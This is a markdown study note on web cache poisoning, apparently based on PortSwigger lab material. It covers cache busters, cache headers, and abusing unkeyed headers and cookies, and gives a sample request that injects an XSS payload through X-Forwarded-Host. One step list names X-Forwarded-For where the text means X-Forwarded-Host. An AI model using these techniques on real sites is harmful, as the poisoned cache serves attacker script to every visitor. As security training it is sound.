## **Detecting Cached Responses**

Add a cache buster parameter ```?cb=1``` in the request. Change the number in the parameter before new request, so that we don't get a cached response. 
<br>
<br>
To confirm caching behavior, inspect response headers and time differences:

- **`X-Cache: hit`** – Response served from the cache.  
- **`X-Cache: miss`** – Response fetched from the origin server and potentially cached.  
- **`X-Cache: refresh`** – Cache was outdated and revalidated.

Additionally, check `Cache-Control` headers for caching directives like `public` with a non-zero `max-age`.

---

# Exploiting cache design flaws

## Using web cache poisoning to deliver an XSS attack

Consider the following request and response:

```txt
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:

```txt
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

If this response was cached, all users who accessed /en?region=uk would be served this XSS payload.

## Web cache poisoning with an unkeyed header

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead. We can use ```X-Forwarded-Host:``` header for this.

**Step**
```
  1. Add a cache buster parameter ?cb=1 in the request.
  2. Add X-forwarded-For header in request.
  3. Add a arbitrary domain (example.com) and send the request.
  4. If the example.com reflected in response page, we can now place our malicious link in it.
```
The malicius link contain with js file will trigger on all users browser if the site is vulnerable to the Web Cache Poisoning.

## Web cache poisoning with an unkeyed cookie

Cookies are often used to dynamically generate content in a response. If the response of the request is cached, then all subsequent users who tried to access the poisoned page will get the malicious content. 

**Step**
```
  1. Add a cache buster parameter ?cb=1 in the request.
  2. Identify if any cookie value reflecting in the response.
  3. If the cookie value reflected in response page, we can now place our malicious javascript code in it.
```

## Web cache poisoning with multiple headers

Identify any unkeyed header using param miner and craft a attack.
<br>
<br>
Poc: [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

## Exploiting responses that expose too much information

### Targeted web cache poisoning using an unknown header

```Vary``` header is used for sending device or client specific content. Using ```Vary``` header in responce, in some cases we can craft an attack.
<br>
<br>
Poc: [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

---

## 
